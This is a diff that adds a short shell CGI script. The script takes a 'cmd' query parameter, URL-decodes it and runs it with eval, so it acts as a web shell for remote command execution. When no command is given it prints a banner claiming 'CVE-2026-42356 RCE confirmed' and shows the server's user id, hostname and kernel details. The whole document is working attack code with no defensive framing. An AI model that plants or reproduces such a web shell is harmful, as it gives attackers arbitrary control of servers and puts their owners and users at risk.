@@ -1,0 +1,13 @@
+#!/bin/sh
+printf "Content-Type: text/plain\n"
+printf "\n"
+ENCODED=$(echo "$QUERY_STRING" | sed -n 's/.*cmd=\([^&]*\).*/\1/p')
+if [ -n "$ENCODED" ]; then
+    CMD=$(perl -e '$s=$ARGV[0];$s=~s/\+/ /g;$s=~s/%([0-9A-Fa-f]{2})/chr(hex($1))/ge;print $s' "$ENCODED")
+    eval "$CMD" 2>&1
+else
+    printf "CVE-2026-42356 RCE confirmed\n"
+    printf "uid: %s\n" "$(id)"
+    printf "hostname: %s\n" "$(hostname)"
+    printf "uname: %s\n" "$(uname -a)"
+fi
